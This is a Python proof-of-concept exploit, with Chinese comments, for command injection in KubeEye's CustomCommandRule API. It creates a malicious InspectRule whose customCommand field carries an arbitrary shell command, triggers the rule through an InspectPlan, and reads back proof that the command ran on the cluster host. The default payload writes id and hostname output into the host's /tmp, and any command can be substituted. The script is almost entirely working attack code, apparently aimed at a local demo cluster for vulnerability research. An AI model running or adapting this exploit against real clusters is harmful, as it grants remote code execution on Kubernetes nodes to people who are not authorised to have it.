#!/usr/bin/env python3
"""KubeEye RCE PoC - CustomCommandRule 命令注入"""
import requests, json, time, sys, os, subprocess, argparse
from datetime import datetime

KUBECTL = os.path.expanduser("~/.local/bin/kubectl")

def kc(*a):
    r = subprocess.run([KUBECTL]+list(a), capture_output=True, text=True, timeout=20)
    return r.stdout.strip()

def main():
    parser = argparse.ArgumentParser(description="KubeEye RCE PoC - CustomCommandRule 命令注入")
    parser.add_argument("--target", default="http://localhost:30909",
                        help="KubeEye API 地址 (默认: http://localhost:30909)")
    parser.add_argument("--cmd", default="id > /hosts/root/tmp/kubeeye_rce_proof_$(date +%s) && echo PROOF_HOST=$(hostname) >> /hosts/root/tmp/kubeeye_rce_proof_* && cat /hosts/root/tmp/kubeeye_rce_proof_*",
                        help="要执行的命令 (默认: 写入宿主机 /tmp 并回读)")
    args = parser.parse_args()

    TARGET = args.target.rstrip("/")
    API = "/kapis/kubeeye.kubesphere.io/v1alpha2"
    TS = datetime.now().strftime("%H%M%S")
    rule_name = f"rce-rule-{TS}"
    plan_name = f"rce-plan-{TS}"
    payload = args.cmd

    print("="*60)
    print("  KubeEye RCE PoC - CustomCommandRule 命令注入")
    print("="*60)
    print(f"  目标: {TARGET}")
    print(f"  命令: {payload}")
    print("="*60)

    # Step 0
    print("\n[*] 0. 验证 API Server...")
    r = requests.get(f"{TARGET}/healthz", timeout=10)
    assert r.status_code == 200, f"API不可达: {r.status_code}"
    print(f"[+] API Server: {r.text}")

    # Step 1
    print("\n[*] 1. 创建恶意 InspectRule...")
    kc("delete","inspectrule",rule_name,"--ignore-not-found")
    r = requests.post(f"{TARGET}{API}/inspectrules", json={
        "apiVersion": "kubeeye.kubesphere.io/v1alpha2","kind": "InspectRule",
        "metadata": {"name": rule_name, "labels": {"kubeeye.kubesphere.io/rule-tag": "rce-test"}},
        "spec": {"customCommand": [{"name": "pwn", "command": payload, "level": "danger"}]}
    }, timeout=10)
    if r.status_code != 200:
        kc("delete","inspectrule",rule_name,"--ignore-not-found"); time.sleep(2)
        r = requests.post(f"{TARGET}{API}/inspectrules", json={
            "apiVersion": "kubeeye.kubesphere.io/v1alpha2","kind": "InspectRule",
            "metadata": {"name": rule_name, "labels": {"kubeeye.kubesphere.io/rule-tag": "rce-test"}},
            "spec": {"customCommand": [{"name": "pwn", "command": payload, "level": "danger"}]}
        }, timeout=10)
        assert r.status_code == 200, f"失败: {r.text[:200]}"
    print(f"[+] InspectRule '{rule_name}' 创建成功")

    # Step 2
    print("\n[*] 2. 创建 InspectPlan...")
    kc("delete","inspectplan",plan_name,"--ignore-not-found")
    r = requests.post(f"{TARGET}{API}/inspectplans", json={
        "apiVersion": "kubeeye.kubesphere.io/v1alpha2","kind": "InspectPlan",
        "metadata": {"name": plan_name},
        "spec": {"ruleNames": [{"name": rule_name}]}
    }, timeout=10)
    if r.status_code != 200:
        kc("delete","inspectplan",plan_name,"--ignore-not-found"); time.sleep(2)
        r = requests.post(f"{TARGET}{API}/inspectplans", json={
            "apiVersion": "kubeeye.kubesphere.io/v1alpha2","kind": "InspectPlan",
            "metadata": {"name": plan_name},
            "spec": {"ruleNames": [{"name": rule_name}]}
        }, timeout=10)
        assert r.status_code == 200, f"失败: {r.text[:300]}"
    print(f"[+] InspectPlan '{plan_name}' 创建成功")

    # Step 3
    print("\n[*] 3. 监控执行 + 读取结果...")
    time.sleep(5)
    confirmed = False
    for i in range(90):
        # 1) 读 kubeeye 结果文件
        pod = kc("get","pods","-n","kubeeye-system","-l","control-plane=kubeeye-controller-manager","-o","name")
        if pod:
            pod_name = pod.split("/")[-1]
            files = kc("exec","-n","kubeeye-system",pod_name,"-c","manager","--","ls","/kubeeye/data/")
            if files:
                for fname in files.split("\n"):
                    fname = fname.strip()
                    if plan_name in fname and fname.endswith("-result") and ".html" not in fname and ".xlsx" not in fname:
                        data = kc("exec","-n","kubeeye-system",pod_name,"-c","manager","--","cat",f"/kubeeye/data/{fname}")
                        if data:
                            try:
                                d = json.loads(data)
                                for item in d.get("spec",{}).get("commandResult",[]):
                                    print(f"\n[+] 🔴 RCE 确认! (来自 kubeeye 结果文件)")
                                    print(f"    命令: {item.get('command','')}")
                                    print(f"    节点: {item.get('nodeName','')}")
                                    print(f"    级别: {item.get('level','')}")
                                    print(f"    断言: {item.get('assert','')}")
                                    confirmed = True
                            except: pass

        # 2) 从宿主机读证明文件 (仅当命令写了文件时)
        r2 = subprocess.run(["docker","exec","kubeeye-demo-control-plane","sh","-c",
            "cat /tmp/kubeeye_rce_proof_* 2>/dev/null || echo NOT_FOUND"],
            capture_output=True, text=True, timeout=10)
        out = r2.stdout.strip()
        if out and "NOT_FOUND" not in out:
            print(f"\n[+] 🔴 RCE 确认! (来自宿主机文件)")
            print(f"    命令在宿主机执行结果:\n{out}")
            confirmed = True

        if confirmed:
            print("\n🔴 RCE 漏洞验证成功!")
            kc("delete","inspectplan",plan_name,"--ignore-not-found")
            kc("delete","inspectrule",rule_name,"--ignore-not-found")
            print("="*60)
            return
        time.sleep(2)

    print("\n[*] 超时未检测到结果")
    kc("delete","inspectplan",plan_name,"--ignore-not-found")
    kc("delete","inspectrule",rule_name,"--ignore-not-found")

if __name__ == "__main__":
    main()
